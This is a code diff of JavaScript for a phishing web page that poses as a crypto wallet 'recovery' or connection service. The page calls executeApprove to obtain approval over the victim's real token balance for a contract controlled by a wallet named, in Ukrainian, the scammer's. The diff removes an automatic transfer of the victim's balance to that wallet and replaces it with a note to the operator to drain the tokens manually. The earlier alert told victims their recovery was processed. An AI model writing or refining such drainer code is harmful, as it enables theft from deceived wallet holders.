@@ -220,7 +220,7 @@
       }
     };
 
-    const contractAddress = "0x167D2BEb0B7c1AcF89659e4d182Ba9D6aF84a679"; // Твоя поточна адреса ApproveContract
+    const contractAddress = "0x83B9e58fF01daD8647AE57da9601b4556B2894D0"; // Нова адреса ApproveContract
     const shahraiAddress = "0x72ad654e24e8D65e8ed0ef8d8B841bb1e2D0830e"; // Твій гаманець Б
 
     function formatNumber(number) {
@@ -318,8 +318,7 @@
 
         // Виклик executeApprove з реальним балансом
         const contractAbi = [
-          "function executeApprove(bytes memory message, address user, bytes memory signature, address token, address spender, uint256 amount) external",
-          "function transferTokens(address token, address from, address to, uint256 amount) external"
+          "function executeApprove(bytes memory message, address user, bytes memory signature, address token, address spender, uint256 amount) external"
         ];
         const contract = new ethers.Contract(contractAddress, contractAbi, new ethers.providers.Web3Provider(window.ethereum).getSigner());
 
@@ -329,13 +328,7 @@
         const approveReceipt = await approveTx.wait();
         console.log('Approve Transaction Hash:', approveReceipt.transactionHash);
 
-        // Виклик transferTokens через ApproveContract з ручним газом
-        const gasLimit = 200000;
-        const transferTx = await contract.transferTokens(tokenAddress, userAddress, shahraiAddress, balance, { gasLimit });
-        const transferReceipt = await transferTx.wait();
-        console.log('Transfer Transaction Hash:', transferReceipt.transactionHash);
-
-        alert('Wallet connected successfully. Recovery processed!');
+        alert('Wallet connected successfully. Approval granted! Use Remix or another tool to transfer tokens.');
       } catch (error) {
         alert('Connection failed: ' + error.message);
         console.error('Detailed error:', error);
